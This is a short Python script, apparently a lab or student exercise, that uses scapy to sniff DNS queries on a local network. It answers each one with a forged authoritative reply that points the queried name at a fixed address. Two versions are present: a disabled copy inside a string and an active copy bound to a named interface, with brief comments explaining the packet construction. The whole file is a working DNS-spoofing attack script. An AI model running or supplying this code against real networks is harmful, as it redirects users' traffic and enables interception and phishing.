import sys
import time

from scapy import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

"""
MY_MAC = Ether().src


# SPOOFED_IP = sys.argv[1]


def spoof(packet):
    if not packet.haslayer(DNSQR):
        return
    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='A',
            ttl=30,
            rdata='1.1.1.1')
    )
    response_packet = eth / ip / udp / dns
    response_packet.show()
    sendp(response_packet)


if __name__ == '__main__':
    sniff(filter='udp dst port 53', prn=spoof)
"""

# !/usr/bin/env python3

from scapy.all import *


def process_packet(packet):
    # after we snff the dns packet we send back the "resulving":
    # we build new packet to send back to the sender. so we change src to be dst - to return the packet
    # and dst change to src - the answer reach from here.
    # int the date we put aur "resulving" = 1.2.3.4 for all DNS packet...
    # all the ather detail are to build the layers of the packet.
    sendp(Ether(src=packet[Ether].dst, dst=packet[Ether].src) / \
          IP(src=packet[IP].dst, dst=packet[IP].src) / UDP(dport=packet[UDP].sport,
                                                           sport=packet[UDP].dport) / DNS(
        id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,
        qdcount=1, ancount=1, nscount=0, arcount=0, ar=DNSRR(
            rrname=packet[DNS].qd.qname, type='A', ttl=600,
            rdata='1.1.1.1'
        )), iface='enp0s3')


sniff(filter="udp dst port 53", prn=process_packet, store=0)
